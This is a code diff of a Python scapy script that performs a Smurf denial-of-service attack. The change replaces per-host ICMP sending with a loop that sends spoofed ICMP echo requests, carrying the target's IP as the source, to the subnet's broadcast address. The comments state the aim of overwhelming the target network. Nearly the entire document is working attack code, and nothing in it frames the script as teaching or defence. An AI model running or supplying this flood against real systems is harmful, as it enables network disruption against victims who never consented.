@@ -1,23 +1,19 @@
-from scapy.all import IP, ICMP, send
+from scapy.all import IP, ICMP, sr1
 from netaddr import IPNetwork
 import argparse
 import sys
 
 g_target_ip = ""
-g_subnet_ips = []
+g_broadcast_ip = ""
 
 
 """
 	This function computes the broadcast address using the subnet mask
 """
-def get_subnet_ips(subnet_mask):
-	global g_subnet_ips
-
-	# Get the list of IP addresses belonging to the subnet
-	g_subnet_ips = list(IPNetwork(g_target_ip+"/"+subnet_mask))
-
-	# Remove the first .0 address and the subnet broadcast address
-	g_subnet_ips = g_subnet_ips[1:len(g_subnet_ips)-1]
+def compute_broadcast_addr(subnet_mask):
+	global g_broadcast_ip
+	ip = IPNetwork(g_target_ip+"/"+subnet_mask)
+	g_broadcast_ip = ip.broadcast
 
 
 """
@@ -25,22 +21,22 @@ def get_subnet_ips(subnet_mask):
 	target's broadcast address
 """
 def start_smurf():
-	global g_subnet_ips
+	global g_broadcast_ip
+	pkt = IP(src = g_target_ip, dst = g_broadcast_ip)/ICMP()
 
 	# Send the packet continuously to overwhelm the target network
 	print("[*] Starting SMURF attack")
-	while True:
-		for ip in g_subnet_ips:
-			pkt = IP(src = g_target_ip, dst = str(ip))/ICMP()
-			try:
-				send(pkt, verbose = False)
-				print("[*] Sent ICMP request to " + str(ip))
-			except KeyboardInterrupt:
-				sys.exit("[#] User Exited")
+	try:
+		while True:
+			resp = sr1(pkt, verbose = False)
+			print(resp)
+
+	except KeyboardInterrupt:
+		sys.exit("User Exited")
 
 
 def main():
-	global g_target_ip
+	global g_target_ip, g_broadcast_ip
 
 	# Get the args
 	parser = argparse.ArgumentParser()
@@ -56,9 +52,10 @@ def main():
 	if (subnet_mask == None):
 		sys.exit("[#] Please specify the subnet mask of the target network.\n[#] Exiting")
 
-	get_subnet_ips(subnet_mask)
+	compute_broadcast_addr(subnet_mask)
 
 	print("[*] Target IP: ", g_target_ip)
+	print("[*] Target Broadcast IP: ", g_broadcast_ip)
 
 	start_smurf()
 
